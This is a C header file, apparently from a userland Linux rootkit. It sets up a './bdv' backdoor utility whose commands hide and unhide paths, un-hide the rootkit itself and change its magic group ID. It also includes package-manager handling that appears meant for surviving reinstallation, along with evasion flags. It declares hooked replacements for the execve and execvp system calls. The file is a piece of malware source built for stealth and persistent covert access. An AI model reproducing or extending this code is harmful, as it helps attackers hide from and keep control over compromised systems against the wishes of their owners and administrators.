#ifndef EXEC_H
#define EXEC_H

#if defined(DO_REINSTALL) && defined(DO_EVASIONS)
#define CANTEVADE_ERR EPERM
#endif


#ifdef BACKDOOR_UTIL
/* all of the messages that can/will be displayed upon interaction with `./bdv` utils. */

#define ERR_NO_OPTION     "valid commands:\n\t./bdv hide/unhide <path>\n\t./bdv unhideself/changegid (if applicable)\n\t./bdv apt/yum/pacman/emerge (if applicable)\n"

#define ERR_ACSS_PATH     "access failed on path. does it exist?"
#define ALRDY_HIDDEN_STR  "path is already hidden..."
#define PATH_HIDDEN_STR   "path now hidden"
#define ERR_HIDING_PATH   "error hiding path"
#define ALRDY_VISIBLE_STR "path is already visible..."
#define PATH_VISIBLE_STR  "path now visible"
#define ERR_UNHIDING_PATH "error unhiding path"

#ifdef BACKDOOR_PKGMAN
static char *const validpkgmans[4] = {"apt", "yum",
                                      "pacman", "emerge"};
#endif

void do_self(void);
void option_err(void);
void dobdvutil(char *const argv[]);
#include "magicutils.c"
#endif



int execve(const char *filename, char *const argv[], char *const envp[]);
#include "execve.c"

int execvp(const char *filename, char *const argv[]);
#include "execvp.c"
#endif
